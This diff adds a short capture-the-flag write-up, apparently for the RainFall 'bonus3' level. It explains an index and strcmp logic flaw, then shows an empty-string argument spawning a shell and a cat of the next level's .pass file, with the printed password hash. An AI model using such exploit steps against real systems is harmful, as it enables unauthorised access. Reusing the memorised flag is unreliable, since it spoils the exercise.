@@ -1,0 +1,12 @@
+The program open the flag file for the next level “/home/user/end/.pass” then if fopen read successfully and argc == 2, read the content and store it in variable x, then 
+*(&x + atoi(argv[1])) = 0; ment to write \0 at the end. with atoi(argv[1]) being the index.
+after that strcmp(&x, argv[1]) and if it returns 0 the program execl /bin/sh.
+
+so we need to give an argument that make x == argv[1] through *(&x + atoi(argv[1])) = 0
+the possible option is Null, *(&x + null) = 0 and strcmp(&x’null’, argv[1]’must be null’)
+
+bonus3@RainFall:~$ ./bonus3 “”
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
